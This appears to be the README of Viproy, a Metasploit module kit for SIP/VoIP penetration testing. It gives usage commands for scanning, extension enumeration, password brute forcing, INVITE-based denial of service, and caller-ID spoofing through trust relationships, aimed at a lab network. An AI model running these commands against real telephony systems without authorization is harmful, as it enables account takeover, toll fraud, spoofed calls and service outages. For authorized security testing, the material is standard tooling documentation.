#Viproy - VoIP Penetration Testing Kit
SIP and NGN Services Testing Modules for Metasploit Framework

#Homepage of Project
http://viproy.com/voipkit<br>

I will publish a SIP Pen-test guide soon at viproy.com/voipkit<br>
Basic Usage of Modules are presented below, it can be used before guide.
All modules have DEBUG and VERBOSE supports

#Preparing Test Network
VulnVOIP is vulnerable SIP server, you can use it for tests<br>
VulnVOIP : http://www.rebootuser.com/?cat=371<br>

#Installation
Copy "lib" and "modules" folders' content to Metasploit Root Directory.<br>
Mixins.rb File (lib/msf/core/auxiliary/mixins.rb) Should Contain This Line<br>
require 'msf/core/auxiliary/sip'<br>

#Sample Usage Video (Video)
http://www.youtube.com/watch?v=1vDTujNVKGM

#Hacking Trust Relationships of SIP/NGN Gateways (Video)
http://www.youtube.com/watch?v=BVJq2yrHYhI

#Hacking Trust Relationships Between SIP Gateways (Video)
http://viproy.com/files/siptrust.pdf

#Global Settings
setg CHOST 192.168.1.99 #Local Host<br>
setg CPORT 5099 #Local Port<br>
setg RHOSTS 192.168.1.1-254 #Target Network<br>
setg RHOST 192.168.1.201 #Target Host<br>

#Basic Usage of OPTIONS Module<br>
use auxiliary/scanner/sip/vsipoptions <br>
show options <br>
set THREADS 255<br>
run<br>

#Basic Usage of REGISTER Module <br>
use auxiliary/scanner/sip/vsipregister<br>
show options <br>
run<br>

set LOGIN true<br>
set USERNAME 101<br>
set PASSWORD s3cur3<br>
run<br>

#Basic Usage of INVITE Module<br>
use auxiliary/scanner/sip/vsipinvite <br>
set FROM 2000<br>
set TO 1000<br>
run<br>

set LOGIN true<br>
set FROM 102<br>
set USERNAME 102<br>
set PASSWORD letmein123<br>
run<br>

set DOS_MODE true<br>
set NUMERIC_USERS true<br>
set NUMERIC_MIN 200<br>
set NUMERIC_MAX 205<br>
run<br>

#Basic Usage of ENUMERATOR Module<br>
use auxiliary/scanner/sip/vsipenumerator  <br>
show options <br>
unset USERNAME  <br>
set USER_FILE /tmp/files/users2 <br>
set VERBOSE false <br>
set METHOD SUBSCRIBE  <br>
run <br>

unset USER_FILE <br>
set METHOD SUBSCRIBE <br>
set NUMERIC_USERS true <br>
set NUMERIC_MAX 2300 <br>
run <br>

set METHOD REGISTER <br>
run <br>

#Basic Usage of BRUTE FORCE Module
use auxiliary/scanner/sip/vsipbruteforce <br>
show options <br>
set RHOST 192.168.1.201 <br>
set USERNAME 2000 <br>
set PASS_FILE /tmp/files/passwords  <br>
set VERBOSE false <br>
run <br>

unset USERNAME  <br>
set USER_FILE /tmp/files/users2 <br>
run <br>

unset USER_FILE <br>
set NUMERIC_USERS true <br>
set NUMERIC_MAX 500 <br>
run <br>

#Basic Usage of Trust Analyzer Module
use auxiliary/scanner/sip/vsiptrust<br>
show options <br>
set SRC_RHOSTS 192.168.1.200-210<br>
set SRC_RPORTS 5060<br>
set SIP_SERVER 192.168.1.201<br>
set INTERFACE eth0<br>
set TO 101<br>
run<br>

show options <br>
set ACTION CALL<br>
set SRC_RHOSTS 192.168.1.202<br>
set FROM James Bond<br>
run<br>

#Basic Usage of SIP Proxy Module
use auxiliary/scanner/sip/vsipproxy <br>
show options <br>
set PRXCLT_PORT 5060<br>
set PRXCLT_IP 192.168.1.99 <br>
set PRXSRV_PORT 5089<br>
set PRXSRV_IP 192.168.1.99 <br>
set CLIENT_IP 192.168.1.120<br>
set CLIENT_PORT 5060<br>
set SERVER_IP 192.168.1.201<br>
set SERVER_PORT 5060<br>
set CONF_FILE /tmp/sipproxy_replace.txt<br>
set LOG true<br>
set VERBOSE false<br>
run


